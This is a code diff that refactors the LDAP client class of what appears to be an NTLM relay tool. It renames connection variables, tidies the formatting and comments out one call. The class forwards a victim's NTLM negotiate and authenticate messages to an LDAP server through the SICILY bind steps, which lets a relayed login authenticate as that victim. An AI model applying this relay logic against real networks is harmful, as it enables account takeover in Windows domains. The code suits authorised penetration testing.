@@ -20,33 +20,36 @@ from ldap3.operation import bind
 
 class LDAPRelayClient:
     MODIFY_ADD = MODIFY_ADD
-    def __init__(self,server,port=None):
-        self.target = server
+
+    def __init__(self, target, port=None):
+        self.target = target
         self.negotiateMessage = None
         self.authenticateMessageBlob = None
-        self.s = None
-        self.c = None
+        self.connection = None
+        self.server = None
 
     def init_connection(self):
-        self.s = Server(self.target, get_info=ALL)
-        self.c = Connection(self.s, user="a", password="b", authentication=NTLM)
-        self.c.open(False)
+        self.server = Server(self.target, get_info=ALL)
+        self.connection = Connection(self.server, user="a", password="b", authentication=NTLM)
+        self.connection.open(False)
 
-    def sendNegotiate(self,negotiateMessage):
+    def sendNegotiate(self, negotiateMessage):
         self.negotiateMessage = negotiateMessage
         self.init_connection()
-        with self.c.lock:
-            result = None
-            if not self.c.sasl_in_progress:
-                self.c.sasl_in_progress = True
-                request = bind.bind_operation(self.c.version, 'SICILY_PACKAGE_DISCOVERY')
-                response = self.c.post_send_single_response(self.c.send('bindRequest', request, None))
+
+        with self.connection.lock:
+            if not self.connection.sasl_in_progress:
+                self.connection.sasl_in_progress = True
+                request = bind.bind_operation(self.connection.version, 'SICILY_PACKAGE_DISCOVERY')
+                response = self.connection.post_send_single_response(self.connection.send('bindRequest', request, None))
                 result = response[0]
                 sicily_packages = result['server_creds'].decode('ascii').split(';')
+
                 if 'NTLM' in sicily_packages:  # NTLM available on server
-                    request = bind.bind_operation(self.c.version, 'SICILY_NEGOTIATE_NTLM', self)
-                    response = self.c.post_send_single_response(self.c.send('bindRequest', request, None))
+                    request = bind.bind_operation(self.connection.version, 'SICILY_NEGOTIATE_NTLM', self)
+                    response = self.connection.post_send_single_response(self.connection.send('bindRequest', request, None))
                     result = response[0]
+
                     if result['result'] == RESULT_SUCCESS:
                         return result['server_creds']
 
@@ -54,17 +57,17 @@ class LDAPRelayClient:
     def create_negotiate_message(self):
         return self.negotiateMessage
 
-    def sendAuth(self,authenticateMessageBlob, serverChallenge=None): 
-        with self.c.lock:
-            result = None
+    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
+        with self.connection.lock:
             self.authenticateMessageBlob = authenticateMessageBlob
-            request = bind.bind_operation(self.c.version, 'SICILY_RESPONSE_NTLM', self, None)
-            response = self.c.post_send_single_response(self.c.send('bindRequest', request, None))
+            request = bind.bind_operation(self.connection.version, 'SICILY_RESPONSE_NTLM', self, None)
+            response = self.connection.post_send_single_response(self.connection.send('bindRequest', request, None))
             result = response[0]
-        self.c.sasl_in_progress = False
+        self.connection.sasl_in_progress = False
+
         if result['result'] == RESULT_SUCCESS:
-            self.c.bound = True 
-            self.c.refresh_server_info()
+            self.connection.bound = True
+            #self.connection.refresh_server_info()
         return result
 
     #This is a fake function for ldap3 which wants an NTLM client with specific methods
@@ -72,7 +75,7 @@ class LDAPRelayClient:
         return self.authenticateMessageBlob
 
     #Placeholder function for ldap3
-    def parse_challenge_message(self,message):
+    def parse_challenge_message(self, message):
         pass
 
     #SMB Relay server needs this
